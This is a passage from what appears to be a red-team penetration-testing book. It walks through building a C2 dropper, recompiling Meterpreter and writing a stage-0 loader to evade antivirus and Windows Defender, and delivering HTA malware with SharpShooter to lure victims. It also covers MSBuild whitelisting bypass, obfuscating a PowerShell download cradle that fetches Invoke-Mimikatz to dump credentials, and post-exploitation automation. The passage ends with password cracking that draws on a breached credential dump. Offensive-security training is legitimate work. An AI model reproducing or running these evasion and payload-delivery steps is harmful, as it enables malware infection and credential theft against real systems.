a\nhandler for each message type. On startup, it will attempt to call back to the\nserver , and retry for n attempts if unable to connect or upon disconnect, and\nsend a message asking for a blob to load. The server will respond back with\na BLOB _PACKET , which the client will recognize and dispatch via the\nhead->msg field. All pack ets must have the HEAD_P ACKET field defined\nat the start, otherwise the network handler will not be able to recognize it,\nand throw it away . Using the BuildPacketAndSend() function will correctly\nset up the head packet, allowing the other side to decode it.\n \nTo build the client, you will need V isual Studio and Git. Start by cloning  the\nGit repository (https://github.com/cheetz/thpDropper .git) into a folder , and\nthen open up thpDropper .sln in Visual Studio. Make sure you are set to the\nproper architecture for the code you are dropping, and set it to build for\nrelease if you don’t want any debug messages. Once you have done this, hit\nF7 and V isual Studio should generate the executables for you.\n \nConfiguring the Client and Server\nMost of the client’s configurati on is accessible in the globals.c pp file, the\nthree main confi guration setting s you will want to change are the hostname,\nthe port, and the packet duration. There are comm ents next to each one,\ntelling you what they are. While you don’t need to change the packet\nsignature, changing it will modify the first 2 bytes of each packet that are\nsent, which is used to identify that it is a valid connection on the server . If\nyou wish to obfuscate the IP and port, you could write code to decrypt them\nwhen they are being accessed, and only store the encrypted version in the\nbinary .\n \nOn the server side, in the main .cpp file, you can modify the port that the\nserver is listenin g on.  This configuration is in the main function  as the only\nparameter to StartupNetworking(). If you decide to change the packet\nsignature in the client, you will need to modify the server to reflect that.\nThis means that in include/lib/networking.h, the PACKET_SIGNA TURE\nvalue needs to match the global value in the client.\n \nAdding New Handlers\nThe networking  code base is set up to allow you to easily add new\nfunctionality . To do so, you will need to create a callback function, with the\nprototype of void name() on the client, or void name(int conn) on the\nserver .  These will be registered to an array of handlers for your message\ntypes, and upon the head packet being validated, they will be called. It is\nyour responsibility in these functions to read your packet and data from the\nrecv buffer. You will want to call recv() to a pointer on your packet’ s\nstructure, along with the size of that packet. This will provide information\nabout how much to pull off the recv buffer.  In this example, you will see\nthat we read the BLOB_P ACKE T in our handler , then used the value stored\nin packet.payloadLen to dictate how many bytes further we had to read. The\nsame principle can be applied to other data types. If you want to send a\nstring containing the file path to some file on the victim’ s computer , you\nwould have a field in the handler’s packet describing the length of the\nstring, which you would send after the packet.\n \nFurther Exer cises\nWhile this code  will give you a solid base to work with, there are many\nways you can improve it yourself. Adding a simple encryption layer to the\ntransport layer would be straightforward. You would want to create your\nown send and recv wrappers, which decrypt/encrypt before calling the send\nand recv functio ns. An extre mely easy way to do this would be to use a\nmulti byte XOR  key, which while not very secure, would at least change\nyour messages enough to not be easily identifiable. Another exercise could\nbe to extend the LoadBlobHand ler() function to have a new LOAD_TYPE,\nwhich would load a signed driver if the client is being run as administrator .\nThis can be accomplished by using the CreateService() and StartService()\nwinapi calls.  However , keep in mind that loading a driver requires it to be\non disk, which will trigger a file system mini-filter driver to pick it up.\n \nRecompiling Metasploit/Meterpreter to Bypass\nAV and Network Detection\nI really wanted to cover this topic.  Be aware that this is going to be a little\nmore advanced and you will most likely run into some issues during\ncompile time.  There are plenty  of great tools like Metasploit/Meterpreter\nout there, but every antivirus and network intrusion detection  (NID) tool\nhas developed signatures for it.  We can try to obfuscate payloads with\nShikata Ga Nai and go over HTTPS, but that only goes so far.  Any type of\nobfuscation will generally have a stub signature to detect off of, AV will\nlook into memory for certain strings in certain locations, and networks\nperform man-in- the-middle inspection over HTTPS.  So how can we do to\nkeep using our favorite tools , while getting around all the common\nprotections?  Let's take the exam ple of Metasploit/Meterpreter and see how\nwe can bypass all these hurdles.   Our goals are to get around AV signatures\non the binary , AV signatures in memory , and network signatures. \n \nIn order to evad e all these detection methods, we will need to do a few\nthings. First, we need to modify  the Meterpreter payloads to make sure they\naren't easily detected with signatures both on the network and in memory .\nSecond, we modify the metsvc persistence module to prevent it from\nflagging anti-virus. Third, we compile portions of metsrv (the actual\nMeterpreter payload) with Clang, to prevent it also from flaggin g anti-virus\nsignatures. Last, we will write our own stage0 payload, which downloads\nand executes Meterpreter , to bypass all anti-virus.\n \nCompiling metsrv (network service wrapper for Meterpreter) with Clang\nand remove metsrv/metsvc-server references:\nhttp://bit.ly/2H2kaUB\n \nModifying Payloads to get rid of strings like Mimikatz\nhttp://bit.ly/2IS9Hvl\n \nModified Reflective DLL Injection to remove strings like ReflectiveLoader\nhttp://bit.ly/2qyWfFK\n \nMany network products detect the stage 0/1/2 loaders of Meterpreter as they\ngo acros s the wire. Besides obfuscating our payload, we can also obfuscate\nthe actual shellcode.  One example is to go through all the Ruby files for the\ndifferent payload types and add random nop sleds to avoid detection:\nhttp://bit.ly/2JKUhdx\n \nCustom Stage0 Payload:\nhttp://bit.ly/2EL Ykm8\n \nLAB:\nIn this lab, we are going to take all of our modified Metasploit/Meterpreter\ncode, recompile it, and make sure that it can evade basic A V detection.\n \nBefore starting, review the build environment setup from Metasploit:\nhttps://github.com/rapid7/metasploit-\npayloads/tree/master/c/meterpreter\nhttps://github.com/rapid7/metasploit-framework/wiki/Setting-\nUp-a-Metasploit-Development-Environment\n \nRequirements for W indows:\nVisual Studio 2013 (VS2013) - Community edition is fine. Need\nC/C++ installed with the install\nLLVM 32bit installed for windows (install this AFTER visual\nstudio and make sure llvm toolchain installs) - Download LL VM\n6 @ http://releases.llvm.or g/download.html\nGNU Make installed on windows\n(http://gnuwin32.sourcefor ge.net/packages/make.htm) - Make\nsure this is in your path or that you run it from its installed path\nwhere applicable.\nGit-SCM (git-scm.com)\n \nHow to Build Metasploit/Meterpr eter on W indows:\nStart by pulling all the cybersp acekitten's repositories.  These files have\nalready been heavily modified for your lab, but as a proof of concept.  First,\nwe need to pull down both the framework and all the payloads:\ngit clone https://github.com/cyberspacekittens/metasploit-\nframework\ncd metasploit-framework && git submodule init && git\nsubmodule update && cd ..\ngit clone https://github.com/cyberspacekittens/metasploit-\npayloads\ncd metasploit-payloads && git submodule init && git\nsubmodule update && cd ..\n \nAlthough all the changes to modify strings, compile to clang, and payload\nnops are already made in these repositories, be sure to review the\nMetasploit dif f between these two to see exactly what was changed.\n \nCompile Metasploit/Meterpreter\nThe first thing we are going to do is recompile our metsvc and metsvc-\nserver with our updated chang es.  From Visual Studio 2013  Command\nPrompt for VS2013:\nGo to the folder where the source code for our modified metsvc\nis.\ncd metasploit-framework\\external\\source\\metsvc\\src\nCompile using make:\n\"C:\\Program Files (x86)\\GnuW in32\\bin\\make.exe\"\n \nMove our newly created binaries to our meterpreter folder:\ncopy metsvc.exe ..\\..\\..\\..\\data\\meterpreter\\\ncopy metsvc-server .exe ..\\..\\..\\..\\data\\meterpreter\\\n \nNext, modify our Meterpreter Payloads and compile them using the\nsupplied .bat file:\ncd metasploit-payloads\\c\\meterpreter\nmake.bat\n \nAfter everything is compiled, two folders are generated (x86 and x64). \nCopy all the compiled DLLs to the meterpreter folder:\ncopy metasploit-payloads\\c\\meterpreter\\output\\x86\\* metasploit-\nframework\\data\\meterpreter\ncopy metasploit-payloads\\c\\meterpreter\\output\\x64\\* metasploit-\nframework\\data\\meterpreter\n \nThat is it for the server .  We can now move the entire metasploit -framework\nfolder to your Kali System and start an HTTPS reverse handler\n(windows/x64/meterpreter/reverse_https).\n \nCreating a Modified Stage 0 Payload:\nThe last thing we need to do is create a Stage 0 payload to have our initial\nexecutable bypa ss all AV detection.  If you aren't aware, a Stage 0 in\nMeterpreter is the first stage of any exploit or payload. This is a chunk of\ncode which does one simple thing: connect back, or listen, in our desired\nway (reverse_https, reverse_tcp, bind_tcp, etc) and then receives a\nmetsrv .dll file. It then loads this file in memory , and executes it.  In essence,\nany Stage 0 payload is just a glorified \"download-and-execut e\" payload.\nBecause this is how all of Metasploit functions, there are advanced\nsignatures and heuristics for Metasploit specific behavior in many anti-virus\nsolutions - even modifying the shellcode and adding junk code will still flag\ndue to the heuristic behavior . To get past this, we write our own Stage 0 that\nperforms the same function (download and execute in memory): we mirror\nthe download calls of Meterpreter's reverse_https payload to fetch\nmetsrv .dll from the server , and then reflect it in memory and execute it.\n \nThe specific example payload  provided here has some more advanced\nfunctionality .  This was done to allow it to be PIC (Position Independent)\nand with no imports.  This code  was developed on top of thealpiste's code\n(https://github.com/thealpiste/C_ReverseHTTPS_Shellcode).\n \nThe example provided performs the following:\nAll code locates DLLs and functions in memory for execution;\nno imports are used.  This is accomplished by manually defining\nstubs for all functions used and then searching for them in\nmemory .\nWininet is used to perform the actual HTTPS requests back to\nthe configured Metasploit handler .\nmetsrv .dll is received, and the data blob is executed. The way\nMetasploit serves these files means the entry-point is the\nbeginning of the buf fer.\n \nThis functionality is the exact same process on how the payloads that are\nbuilt into msfvenom are executed. However , msfvenom adds these to\ntemplate executa bles in a very predictable, detectable manner , which is not\nconfigurable.  Because of that, most AV identifies them all the time.\nInstead, with a little coding know-how , you can re-write the functionality of\nthe payloads, since they are small, and bypass any detection which currently\nexists. This payload is known to bypass all AV, including Windows\nDefender , at the time of this writing.\n \nCreating the Payload (Full Payload is located here: http://bit.ly/2EL Ykm8):\n \nIn VS13, open metasploit-\npayloads\\c\\x64_defender_bypass\\x64_defender_bypass.vcxproj\nUnder x64_defender_bypass there is a settings.h file. Open this\nup and modify the HOST and POR T information to your\nMeterpreter handler information.\nMake sure to set the build to \"Release\" and compile \"x64\"\nSave and build\nunder metasploit-payloads\\c\\x64_defender_bypass\\x64\\Release\na new binary \"x64_defender_bypass.exe\" will be created. \nExecute this payload on your victim machine that is running\nWindows Defender .  When this project was build, W indows\nDefender did not detect this payload.\n \nYou now have a heavily obfuscated Meterpreter binary and obfuscated\ntransport layer to get around all of the default protections.  Now , this was\njust a proof of concept to get you started.  As soon as this book is released, I\nam sure a signat ure will be detected for some of these techniques.  There is\nstill much more you can do to better evade detection tools.  For example,\nyou can:\nBuild with a clang obfuscation toolchain\nUse a String Encryption library for all strings\nChange Meterpreter entry-point (it is currently Init)\nCreate an automated script, adding nops to all the payload types\nEdit the actual ruby for the payload generation to randomize the\npayload's on every run\n \nS h a r p S h o o t e r\nAs a Red Teamer , one of the most time consuming areas is creating\npayloads that evade next generation AV and sandboxes.  We are constantly\nlooking for new methods to create our initial stagers.  One tool, called\nSharpShooter , takes a lot of the anti-sandboxing techniques and James\nForshaw’ s DotN etToJScript to execute shellcode in Window s scripting\nformats (CACTUST ORCH tool -\nhttps://github.com/mdsecactivebreach/CACTUST ORCH). \n \nFrom MDSec's website on SharpShooter , \"SharpShooter supports both\nstaged and stageless payload execution. Staged execution can occur over\neither HTTP(S), DNS or both. When a staged payload is executed, it will\nattempt to retrieve a C Sharp source code file that has been zipped and then\nbase64 encoded using the chosen delivery technique. The C Sharp source\ncode will be downloaded and compiled on the host using the .NET\nCodeDom compiler . Reflection is then subsequently used to execute the\ndesired method from the source code.”\n[https://www .mdsec.co.uk/2018/03/payload-generation-using-sharpshooter/\n] \n \nLet's walk through a quick example:\npython SharpShooter .py --interactive\n1 - For .NET v2\nY - Staged Payload\n1 - HT A Payload\nThe following anti-sandbox techniques are available:\nYou can pick your techniques to get around sandboxes\nfrom successfully executing your malware.\n[1] Key to Domain\n[2] Ensure Domain Joined\n[3] Check for Sandbox Artifacts\n[4] Check for Bad MACs\n[5] Check for Debugging\n1 - W eb Delivery\nY - builtin shellcode template\nshellcode as a byte array\nOpen a new terminal and create a csharp Meterpreter\npayload\nmsfvenom -a x86 -p\nwindows/meterpreter/reverse_http\nLHOST=10.100.100.9 LPOR T=8080\nEnableStageEncoding=T rue\nStageEncoder=x86/shikata_ga_nai -f csharp\nCopy everything between the \"{\" and \"}\" and submit\nas the byte array\nProvide URI for CSharp web delivery\nPut in your attacker IP/port and file.  Example:\nhttp://10.100.100.9/malware.payload\nProvide name of output file\nmalware\nY - Do you want to smuggle inside HTML?\nUse a custom (1) or predefined (2) template\nFor testing, choose any of the predefined templates\nMove the newly create malicious files to your web directory\nmv output/* /var/www/html/\nSet up a Meterpreter handler for your payload\n \nOnce you configure and deve lop your malware, move it to the web\ndirectory (malw are.hta, malware.html, malware.payload), start your\napache2 service , and start your Meterpreter handler .  You are now ready to\nsocial engineer your victim into visiting your malicious site!  The example\ngiven above was Sharpshooter ’s SharePoint online template.  When the\nvictim visits your malicious page using IE/Edge, the HTA automatically\ndownloads and prompts to run.  Once prompted and selected  to run, the\nstager payload will run, download the secondary payload (if sandbox\ncontrols are met), and execute our Meterpreter payload in memory .\n \n \n \nAdditional Information:\nhttps://www .mdsec.co.uk/2018/03/payload-generation-using-\nsharpshooter/\nhttps://github.com/mdsecactivebreach/SharpShooter\n \nApplication Whitelisting Bypass\nWe have talked about the different ways to trigger PowerShell without\nrunning the PowerShell code, but what if you can't run custom binaries on\nthe Windows System?  The concept of Application Bypass is to find default\nWindows binaries that can execute our payloads.  We have been on boxes\nlike Domain Controllers that are locked down well and coded execution is\nlimited.  There are different Windows files we could use to bypass these\nrestrictions—let’ s go over a couple of them. \n \nOne Windows binary that is often talked about, which circumvents\nApplication Whitelisting, is MSBuild.exe.  What is MSBuild.exe and what\ndoes it do?  MSBuild is a defau lt application within the .NET Framework\nand serves as a platform for building .NET applications using a project file\nin XML format.  We can abuse  this feature by creating our own malicious\nXML project file to execute a Meterpreter session, using a tool called\nGreatSCT .\n \nGreatSCT (https://github.com/GreatSCT/GreatSCT) has various\nApplication Whitelisting Bypasses that we can use, but we are just going to\ncover MSBuild.  In this exampl e, we will create a malicious XML file that\nhosts a reverse_ http Meterprete r session.  This will require us to write the\nXML file to the victim system and use MSBuild to execute the XML file:\ngit clone https://github.com/GreatSCT/GreatSCT .git /opt/\ncd /opt/GreatSCT\npython3 ./gr8sct.py\n[4] MSBUILD/msbuild.cfg\nEnter your host IP [0] and port [1]\ngenerate\nSet up a windows/meterpr eter/reverse_http handles in\nMetasploit\n \n \nIn our Kali instance, we used GreatSCT to create the shellco de.xml file,\nwhich has both build informatio n and a Meterpreter reverse http shell.  This\nfile would need to be moved to our victim system and called, using\nMSBuild.\n \n*Note: I do see GreatSCT being actively built on the \"develop\" branch\n(https://github.com/GreatSCT/GreatSCT/tree/develop), which includes\nhttps Meterpreter and additiona l whitelisting bypasses.  I assume by the\ntime this book is released, it will be moved to \"master .\"\n \n \nOnce executed on our Windows victim machine, using the command\n\"C:\\W indows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe\nshellcode.xml\", .NET will start to build the shellcode.xml file.  During this\nprocess, your victim machine will spawn a reverse http Meterpreter session,\nbypassing any application whitelisting.   You may want to edit the\nshellcode.xml file to put in obfuscated payloads, as the default Meterpreter\nwill most likely trigger A V.\n \n \n \nThere are many different ways to perform Application Whitelisting\nBypasses that it would be a book of its own.  Here are some additional\nresources:\nTons of great examples using W indows default executables:\nhttps://github.com/api0cradle/UltimateAppLockerByP\nassList\nUsing REGSR V32 and PowerShell Empire:\nhttps://www .blackhillsinfosec.com/evade-application-\nwhitelisting-using-regsvr32/\nDLL Execution via Excel.Application RegisterXLL:\nhttps://rileykidd.com/2017/08/03/application-\nwhitelist-bypass-using-XLL-and-embedded-\nshellcode/\nLeveraging INF-SCT Fetch & Execute T echniques For Bypass,\nEvasion, & Persistence:\nhttps://bohops.com/2018/03/10/leveraging-inf-sct-\nfetch-execute-techniques-for -bypass-evasion-\npersistence-part-2/\nAppLocker Bypass with Regsvr32:\nhttps://pentestlab.blog/2017/05/1 1/applocker -bypass-\nregsvr32/\n \nCode Caves\nAs with any Red Team campaign, we are always looking for creative ways\nto move laterally within an environment or keep persistence.  Usually , if we\nhave credentials, we try to execu te payloads on a remote system  using WMI\nor PSEx ec.  There are times, though when we need to find creative ways to\nmove within an environment without being easily tracked. \n \nAs Red Teamers, getting caug ht is not the worst thing that can happen\nduring a campaign.  It is when we get caught and the Blue team  finds every\ndomain, IP, and compromised host that was part of the campaign.  It is\ngenerally pretty easy for Blue teamers to review the WMI/PSExec style\nconnections to identify lateral movement, since it is not always seen as\nnormal traffic.  So what can we do to hide our lateral movement  a bit more?\n \nThis is where we can get creativ e and there is no right answer (if it works,\nthat’s good enough for me).  One of my favorite things to do once inside an\nenvironment is to identity the public shares and files that are actively\nshared/executed.  We could try to add macros to Office files, but that might\ncome off too obvious.  One attack that generally has low detecti on, but high\nsuccess rates, is embedding our custom malware inside executable binaries. \nThis could be a shared binary like putty , a common internal thick client, or\neven database tools. \n \nAlthough no longer maintained , one of the easiest tools to perform these\nattacks was called Backdoor factory (https://github.com/secretsquirrel/the-\nbackdoor -factory).  Backdoor factory would look for code caves or empty\nblocks within a real program, where an attacker can inject their own\nmalicious shellcode.  This was covered in THP2 and the ideas remain the\nsame. \n \nTwo great additional resources for backdooring executables can be found\nhere:\nhttps://haiderm.com/fully-undetectable-backdooring-pe-\nfile/#Code_Caves\nhttps://www .abatchy .com/2017/05/introduction-to-manual-\nbackdooring_24.html\n \nPowerShell Obfuscation\nThe problem with PowerShell Scripts today is that if you are dropping them\nonto disk, many antivirus tools will pick them up.  Even if you import them\ninto memory , AV tools that look in memory may sometimes alert on them,\ntoo. \n \nRegardless, if you are importin g them into memory from Cobalt Strike,\nMeterpreter , or PowerShell Empire, it is important to make sure that we\ndon't get picked up by AV.  If we do, we should, at the very least, make it\nhard for IR/Forensic teams to reverse our attack payloads. \n \nWe have all seen the commands for PowerShell like this:\nPowershell.exe -NoProfile -NonInteractive -W indowStyle\nHidden -ExecutionPolicy Bypass IEX (New-Object\nNet.W ebClient).DownloadString('[PowerShell URL]');\n[Parameters]\n \nThis the most basic combinati on of strings we might see to bypass the\nexecution policy , run hidden/noninteractive, and to download and execute a\nPowerShell payload.  For Blue Teams, we have seen a lot of logging picked\nup on these specific parameters like \"-Exec Bypass\".  So, we started\nobfuscating this parameter by some common PowerShell syntax:\n-ExecutionPolicy Bypass\n-EP Bypass\n-Exec Bypass\n-Execution Bypass\n \nWhat is even crazier , and I give credit to Daniel Bohannon for identifying\nthis, is that you don't actually need to do the full parameter string to get it to\nwork.  For example, for -ExecutionPolicy Bypass, all of these examples\nwill work:\n-ExecutionPolicy Bypass\n-ExecutionPol Bypass\n-Executio Bypass\n-Exec Bypass\n-Ex Bypass\n \nThese same techniques will work for WindowStyle or even the\nEncodedCommand parameter .  Of course, these tricks will only get us so far\nand we need to create more obfuscated transforms.  To start, we can take a\nvery simple example to execute our remote PowerShell script (in this case\nMimikatz) and dump hashes using an administrative PowerShell Prompt:\nInvoke-Expression (New-Object\nNet.W ebClient).DownloadString('http://bit.ly/2JHVdzf');\nInvoke-Mimikatz -DumpCreds\n \nGoing through (Invoke-Obfuscation), we can take this string and heavily\nobfuscate it using several dif ferent techniques:\nOn W indows, download the PowerShell Files for Invoke-\nObfuscation (https://github.com/danielbohannon/Invoke-\nObfuscation)\nLoad PowerShell script and start Invoke-Obfuscation\nImport-Module ./Invoke-Obfuscation.psd1\nInvoke-Obfuscation\nSet your PowerShell Script you want to Obfuscate.  In this case,\nwe will obfuscate the Download and Dump Hashes from\nMimikatz above.\nSET SCRIPTBLOCK Invoke-Expression (New-\nObject\nNet.W ebClient).DownloadString('http://bit.ly/2JHVdz\nf'); Invoke-Mimikatz -DumpCreds\nEncode the Payload\nENCODING\nIn this case, I chose SecureString (AES), but you can play\naround with all the obfuscation techniques.\nIf you look at the obfuscated string, there is a randomly genera ted key and\nan encrypted secure string.  Upon execution an administrative PowerShell,\nwe still get the full payload to execute.\n \nWe can also go back to the main screen and create obfuscated launchers:\nmain\nlauncher\nCLIP++\nChoose your execution flags\n \n \nEven better is that if we look in the Windows PowerShell logs, it is very\nobfuscated and could help evade A V and SEIM alerting tools.\n \n \nIn addition to Invoke-Obfuscation, Daniel created a tool that focuses on\nremote download cradles called Invoke-CradleCrafter .  \"Invoke-\nCradleCrafter exists to aid Blue Teams and Red Teams in easily exploring,\ngenerating and obfuscating PowerShell remote download cradles. In\naddition, it helps Blue Teams test the effectiveness of detectio ns that may\nwork for output produced by Invoke-Obfuscation but may fall short when\ndealing with Invoke-CradleCra fter since it does not contain  any string\nconcatenations, encodings, tick marks, type casting, etc.”\n[https://github.com/danielbohannon/Invoke-CradleCrafter]\n \nPowerShell Without PowerShell:\nYou finally get remote code execution on a box, but you find out that you\neither can't run PowerShell.exe or the company is monitoring\nPowerShell.exe commands.  What are your options to get your PowerShell\npayload or C2 agents running on that host system? \n \nNoPowerShell (NPS)\nI love the conce pt of NoPowerShell or NPS.  NPS, is a Windows Binary\nthat executes PowerShell through .Net, instead of directly calling\nPowerShell.exe.  Although this is generally flagged today by A V, we use the\nsame concepts to create binaries to directly execute our PowerShell\nmalware without needing PowerShell.exe.  Ben0xA does give you source,\nso feel free to try to obfuscate the binary to get around A V.\n \nNPS_Payload (https://github.com/trustedsec/nps_payload)\nAnother take on NPS is a tool by TrustedSec that takes advantage of\nexecuting code through MSBuild.exe.  This tool generates a PowerShell\npayload into a msbuild_nps.xml file that is executed when called.  The\nXML file can be called by:\nC:\\W indows\\Microsoft.NET\\Framework\\v4.0.30319\\msbuild.ex\ne C:\\<path_to_msbuild_nps.xml>\n \nSharpPick\nSharpPick, a component of PowerPick, is a great tool that allows you to call\nPowerShell without ever calling the PowerShell.exe binary .  Within\nSharpPick, \"the RunPS function uses the System.Management. Automation\nfunction to execute a script inside of a PowerShell runspace without ever\nstarting a PowerShell process.” [ http://www .sixdub.net/?p=555] \n \nAfter you download SharpPick\n(https://github.com/PowerShellEmpire/PowerT ools/tree/master/PowerPick),\nyou can take your PowerShell Empire payloads and create binaries.  A full\nwalkthrough of how to set up your environment and build your payload can\nbe found at:\nhttp://www .sixdub.net/?p=555\nhttps://bneg.io/2017/07/26/empire-without-powershell-exe/\n \nThere are times when dropping a binary on the host system might not be\npossible.  In those cases, we can create a Class Library (DLL file) that we\ncan drop onto the system and execute with \"rundll32.exe\nrunmalicious.dll,EntryPoint\".\n \nOf course, the creation of these DLLs can be automatically done for\nMeterpreter or Cobalt Strike, but it's nice having the flexib ility to run\nspecific PowerShell payloads without ever calling PowerShell.exe.\n \nHideMyPS\nOne tool that I wrote a few years ago, which still has great success is\nHideMyPS (found here: https://github.com/cheetz/hidemyps).  This was\nalways just a POC tool, but it still works even after all these years.  The\nissue I was running into was that any PowerShell script these days gets\npicked up by AV.  For example, if we drop the normal Invoke-M imikatz.ps1\n(http://bit.ly/2H3CNXS) on a Windows system with Windows Defender , it\nwill pick up the PowerShell script instantly and send red flags everywhere. \nThis is one of the major flaws  of traditional AV and the fact that they\ngenerally look for very specific strings in malware.  There fore, I put\ntogether a small Python script that takes a PowerShell script and obfuscates\nall the strings (this was only tested with a few scripts, so it is nowhere near\nproduction code). \n \nHideMyPS will find all the functions and obfuscate them using ROT ,\nremove all comments from PowerShell scripts, and cut strings to evade\nstatic A V signatures.   For the next example, let's take Invoke_Mimikatz.ps1\n(http://bit.ly/2H3CNXS) and obfuscate the PowerShell file:\ncd /opt/HideMyPS\npython hidemyps.py invoke_mimikatz.ps1 [filename.ps1]\n \n \nNow , take a look at the difference between the original file and the new file\nyou created.  First off, you can see the function names are all mixed up,\nvariables have been changed, strings have been broken in half, and all the\ncomments are missing.\n \n \nThe one thing you have to remember is that we changed all the function\nnames in the PowerShell script.  So, in order to call the functions, we are\ngoing to have to look back in our obfuscated file and see what we did to\nreplace \"function Invoke-Mimikatz\".  In this case, Invoke-Mimikatz was\nchanged to Vaibxr -Zvzvxngm.  The following example was run on a fully-\npatched W indows 10 with Defender completely up-to-date.\n \n \nC o n c l u s i o n\nAs Red Teamers or Penetration Testers, it is always going to be a cat and\nmouse game with host and network detection tools.  This is why it is very\nimportant to be able to underst and how the underlying protections work,\nwrite lower -leve l code to interact directly with Windows APIs versus shell\ncommands, and to think outside  the box and get creative.  If you focus on\nonly using common tools, the likelihood that you will get detected in a\ncorporate enviro nment is pretty high.  If the tools are public, most likely the\nsecurity vendor s are reversing these as quickly as they come out and\ndeveloping signatures for them.  It is up to you to take the current attacks\nand exploit and craft them in a way so that they are not recogniz ed by these\nvendors.\n \n \n \n \n \n \n \n \n8 special teams - cracking, exploits, and tricks\n \n \n \n \nThis chapter focuses on a handfu l of different resources that I have found to\nbe useful for both Red Teams and Penetration Testing.  Thes e resources\nmay not be used in every camp aign, but are great for specific scenarios or\none-of f cases. \n \nAutomation\nAs heuristic-based endpoint protections get better and better , our attacks\nneed to become  quicker and quicker .  We can generally write malware to\nevade AV and get through the initial detections, but once we start making\ncalls like Mimikatz (in memory ) or moving laterally to another host, we\nstart to set off alarms.  To counter this, I always tell Red Teams to get\ncaught on the first attempt.  Usually , Blue Teams see this as a win when\nthey trigger on our basic/default style (or slightly obfuscated) malware, but\nthe real purpose  of it is to just learn about their environme nt.  This is\naccomplished by our initial payload auto-running multiple reconnaissance\nscripts on the victim’ s machine.   In the next section, we will go over some\nquick auto-run scripts that can help automate some of our attacks.\n \nAutomating Metasploit with RC scripts\nWith Metasploit, we can ef ficiently and ef fectively run our post-exploitation\nscripts using:\nSearch all Post Exploitation Modules in Metasploit\nmsfconsole\nshow post\n \nFrom the “post” results, select all the modules you want to include for auto-\nexecution when receiving a Meterpreter Shell.  In this case, we are going to\nadd a privilege migrate post exploitation (http://bit.ly/2vn1wFB) to our\nattack.  T o configure the Meterpreter Shell so that it runs this payload on the\ninitial connection from our compromised host, we need to specify an\nAutoRunScript parameter .  Feel free to add as many AutoRunSc ripts as you\nneed to dump information about the system/network, move laterally , and\nmore!\n \nCreating a Handler and AutoRunScript:\nCreate a handler file\ngedit handler .rc\nConfigure the handler and autorun scripts\nuse multi/handler\nset payload windows/meterpreter/reverse_https\nset LHOST 10.100.100.9\nset LPOR T 443\nset AutoRunScript\npost/windows/manage/priv_migrate\nset ExitOnSession false\nset EnableStageEncoding true\nexploit -j\nStart handler\nmsfconsole -r handler .rc\n \nAutomating Empir e\nEmpire has similar features to Metasploit’ s resource files, which automate\nmany of the repetitive tasks.  First, we need to create a file (in our example,\nwe will create a file called /opt/empire_autoload.rc) and then load it within\nour Empire instance. \n \nIn a separate terminal window , create a handler file:\ngedit /opt/empire_autoload.rc\nAdd all the post modules you want to execute: \nusemodule\nsituational_awareness/network/powerview/get_user\nexecute\nback\nusermodule\nsituational_awareness/network/powerview/get_compu\nter\nexecute\nback\nWithin Empire, load the autoload.rc resource file:\nagents\nautorun /opt/empire_autoload.rc powershell\nautorun show\n \n \nAs you can see, when the agent connected, it automatically ran the get_user\nand get_computer PowerShell scripts.  All the results of these scripts will be\nstored in the agent.log file.  In this case, our agent name is N6LM348G, so\nour logs will be stored in /opt/Empire/downloads/N6LM348G/agent.log.\nAutomating Cobalt Strike\nOne of the main reasons that Cobalt Strike is so powerful is because of the\nAggressor Scripts (https://www .cobaltstrike.com/aggressor -\nscript/index.html).  With Cobalt Strike Aggressor Scripts, not only can you\nconfigure autorun style scripts, but you can also create very complex\nattacks.  For example, I often come across the situation where we get on a\nshared workstat ion, like a lab or conference room box.  One thing I may\nwant our agent to do is run Mimikatz every half hour to pull clear text\ncredentials.  With Aggressor Scripts, we can do all these actions and more. \nHere is an example script that does just that: mimikatz-every-30m.cna\n(http://bit.ly/2IXgIel). \n \nAggressor Collection Scripts:\nhttps://github.com/bluscreenofjef f/AggressorScripts\nhttps://github.com/harleyQu1nn/AggressorScripts\n \nThe Futur e of Automation\nLastly , there are some cool projects that are moving toward automation,\nsmart compromi se, and APT attacks.  I heavily believe that automation of\nattack is going to be the future of compromises and we will need the ability\nto test/validate our security controls.  Two tools I see having great potential\nin starting this automation trend are:\nPortia - https://github.com/SpiderLabs/portia\nCaldera - https://github.com/mitre/caldera\n \nPassword Cracking\nOne of my newest and most favorite password lists comes from the recent\n41GB password dump that contains 1.4 billion usernam e/passwords\n(http://bit.ly/2HqbYk8).  Now , I don't want to link directly to the torrent as\nit does contain a lot of sensit ive usernames (or emails) and associated\npasswords, but you can search for BreachCompilation.tar .bz2 to find more\ninformation about it.  Please check with your laws before downloading this\nvery sensitive information.  I do recommend, instead of grabbing the\noriginal dump, that you just grab the password lists.  I have taken the 41GB\ndump, stripped out all the usernames/emails, and made a list of just\npasswords.  It is located here:  http://thehackerplaybook.co m/get.php?\ntype=THP-password.\n \nOn my personal system, I am using 8x Gigabyte GV-N108TTU RBO-1 1GD\nAORUS GeForce GTX 1080 Ti Turbo 11G Graphic Cards.  For about\n$12,000, you can build one of your own, includes a chassis, RAM, power\nsupply , SSD, and GPUs.  Of course, the chassis will require at least a 4U\nrackmount (for example: SYS-4028GR-TR2) and plenty of power . \nAlthough definitely not cheap, we are cracking about 472,000,000,000\nhashes per second, and bruteforcing NTLM (Windows) hashes .  Here is a\nhashcat benchmark of the eight GPUs:  Hashmode: 1000 - NTLM\n \nSpeed.Dev .#1.....: 59436.3 MH/s (63.16ms)\nSpeed.Dev .#2.....: 58038.3 MH/s (64.70ms)\nSpeed.Dev .#3.....: 59104.4 MH/s (63.55ms)\nSpeed.Dev .#4.....: 59123.0 MH/s (63.52ms)\nSpeed.Dev .#5.....: 58899.7 MH/s (63.74ms)\nSpeed.Dev .#6.....: 59125.8 MH/s (63.51ms)\nSpeed.Dev .#7.....: 59256.3 MH/s (63.36ms)\nSpeed.Dev .#8.....: 59064.5 MH/s (63.56ms)\nSpeed.Dev .#*.....:   472.0 GH/s\n \nFor those who can't afford a massive GPU rig, there are other options. \nAlthough still not cheap, you can look into cracking in the cloud .  Recently ,\nAmazon has integrated TESLA GPUs (not the car)\nhttp://www .nvidia.com/object/tesla-servers.html, which are more powerful\nthan the 1080T is.  There is a great article on the Medium about setting up\nyour own cracking servers utilizing these GPUs:\nhttps://medium.com/@iraklis/running-hashcat-v4-0-0-in-amazons-aws-\nnew-p3-16xlar ge-instance-e8fab4541e9b. \n \nStatics from Iraklis Mathiopoulos article:\nHashmode: 1000 - NTLM:\n \nSpeed.Dev .#1.....: 79294.4 MH/s (33.81ms)\nSpeed.Dev .#2.....: 79376.5 MH/s (33.79ms)\nSpeed.Dev .#3.....: 